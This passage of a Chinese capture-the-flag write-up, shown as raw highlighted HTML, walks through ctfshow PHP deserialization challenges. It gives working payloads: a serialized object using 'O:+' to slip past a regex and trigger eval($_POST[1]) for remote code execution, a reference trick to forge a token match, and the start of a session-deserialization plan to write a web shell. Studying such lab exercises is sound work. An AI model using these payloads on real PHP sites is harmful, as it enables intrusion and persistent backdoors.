punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/[oc]:\\d+:/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token variable\">$user</span><span class=\"token operator\">-></span><span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>首先可以发现多了个这个正则</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">/</span><span class=\"token punctuation\">[</span>oc<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span>\\d<span class=\"token operator\">+</span><span class=\"token punctuation\">:</span><span class=\"token operator\">/</span>i<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>首先了解一下[]的含义</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> 字符集合<span class=\"token punctuation\">(</span>字符域<span class=\"token punctuation\">)</span>。匹配所包含的任意一个字符。例如， <span class=\"token string single-quoted-string\">'[abc]'</span> 可以匹配 <span class=\"token string double-quoted-string\">\"plain\"</span> 中的 <span class=\"token string single-quoted-string\">'a'</span>。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>此时的话就可以看明白了，其含义就是过滤<code>o:</code>数字和<code>c:</code>数字,可以在<code>:</code>和数字中间加上个<code>+</code>号来使过滤失效，此时就类似于简单题的0X03，利用backdoor类进行构造即可<br>代码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfShowUser</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$isVip</span><span class=\"token operator\">=</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$class</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'info'</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">backDoor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$u</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token operator\">===</span><span class=\"token variable\">$u</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token operator\">===</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token keyword\">class</span><span class=\"token operator\">-></span><span class=\"token function\">getInfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">backDoor</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$code</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'eval($_POST[1]);'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getInfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">ctfShowUser</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'O:'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'O:+'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'C:'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'C:+'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>得到</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">O</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">2</span>B11<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>ctfShowUser<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>A4<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">7</span>Bs<span class=\"token operator\">%</span><span class=\"token number\">3</span>A8<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>username<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>Bs<span class=\"token operator\">%</span><span class=\"token number\">3</span>A6<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>xxxxxx<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>Bs<span class=\"token operator\">%</span><span class=\"token number\">3</span>A8<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>password<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>Bs<span class=\"token operator\">%</span><span class=\"token number\">3</span>A6<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>xxxxxx<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>Bs<span class=\"token operator\">%</span><span class=\"token number\">3</span>A5<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>isVip<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>Bb<span class=\"token operator\">%</span><span class=\"token number\">3</span>A0<span class=\"token operator\">%</span><span class=\"token number\">3</span>Bs<span class=\"token operator\">%</span><span class=\"token number\">3</span>A5<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>class<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>BO<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">2</span>B8<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>backDoor<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>A1<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">7</span>Bs<span class=\"token operator\">%</span><span class=\"token number\">3</span>A4<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>code<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>Bs<span class=\"token operator\">%</span><span class=\"token number\">3</span>A16<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>eval<span class=\"token operator\">%</span><span class=\"token number\">28</span><span class=\"token operator\">%</span><span class=\"token number\">24</span>_POST<span class=\"token operator\">%</span><span class=\"token number\">5</span>B1<span class=\"token operator\">%</span><span class=\"token number\">5</span>D<span class=\"token operator\">%</span><span class=\"token number\">29</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">7</span>D<span class=\"token operator\">%</span><span class=\"token number\">7</span>D<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>此时就可以进行rce了<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141545079.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"利用引用-1\"><a href=\"#利用引用-1\" class=\"headerlink\" title=\"利用引用\"></a>利用引用</h2><p>源代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfshowAdmin</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$token</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">token</span><span class=\"token operator\">=</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$p</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">login</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">token</span><span class=\"token operator\">===</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token variable\">$ctfshow</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ctfshow'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$ctfshow</span><span class=\"token operator\">-></span><span class=\"token property\">token</span><span class=\"token operator\">=</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token function\">mt_rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ctfshow</span><span class=\"token operator\">-></span><span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里我们只需要保证token和password相同就可以得到flag，利用这个<code>&amp;</code>即可</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfshowAdmin</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$token</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">token</span><span class=\"token operator\">=</span><span class=\"token operator\">&amp;</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">login</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">token</span><span class=\"token operator\">===</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">ctfshowAdmin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>得到<code>O:12:&quot;ctfshowAdmin&quot;:2:&#123;s:5:&quot;token&quot;;N;s:8:&quot;password&quot;;R:2;&#125;</code>，赋值给参数ctfshow即可得到flag</p>\n<h2 id=\"session反序列化-1\"><a href=\"#session反序列化-1\" class=\"headerlink\" title=\"session反序列化\"></a>session反序列化</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token comment\">#check.php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">require_once</span> <span class=\"token string single-quoted-string\">'inc/inc.php'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$GET</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"u\"</span><span class=\"token operator\">=></span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"pass\"</span><span class=\"token operator\">=></span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pass'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GET</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\n\t<span class=\"token variable\">$data</span><span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token punctuation\">[</span>\t<span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">,</span>\n\t\t<span class=\"token string single-quoted-string\">'UserName0'</span>\n\t<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">[</span>\n\t\t<span class=\"token string double-quoted-string\">\"AND\"</span><span class=\"token operator\">=></span><span class=\"token punctuation\">[</span>\n\t\t<span class=\"token string double-quoted-string\">\"UserName0[=]\"</span><span class=\"token operator\">=></span><span class=\"token variable\">$GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n\t\t<span class=\"token string double-quoted-string\">\"PassWord1[=]\"</span><span class=\"token operator\">=></span><span class=\"token variable\">$GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pass'</span><span class=\"token punctuation\">]</span> <span class=\"token comment\">//密码必须为128位大小写字母+数字+特殊符号，防止爆破</span>\n\t\t<span class=\"token punctuation\">]</span>\n\t<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token comment\">//登陆成功取消次数累计</span>\n\t\t<span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limit'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">echo</span> <span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"success\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"msg\"</span><span class=\"token operator\">=></span><span class=\"token string double-quoted-string\">\"欢迎您\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'UserName0'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token comment\">//登陆失败累计次数加1</span>\n\t\t<span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limit'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">echo</span> <span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"error\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"msg\"</span><span class=\"token operator\">=></span><span class=\"token string double-quoted-string\">\"登陆失败\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token comment\">#inc.php</span>\n<span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'session.serialize_handler'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">User</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$status</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">setStatus</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">status</span><span class=\"token operator\">=</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"log-\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"使用\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"登陆\"</span><span class=\"token operator\">.</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">status</span><span class=\"token operator\">?</span><span class=\"token string double-quoted-string\">\"成功\"</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"失败\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"----\"</span><span class=\"token operator\">.</span><span class=\"token function\">date_create</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token function\">format</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Y-m-d H:i:s'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>在<code>inc.php</code>中没有找到有关session注入的地方，不过这里我们知道了它是用php来读的，同时得到了一个类，同时呢我们会发现这个类在销毁的时候会进行一个<code> file_put_contents</code>，username和password是可控的，这里我们就想到借此来写一个木马文件</p>\n<p>此时查看<code>index.php</code></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token 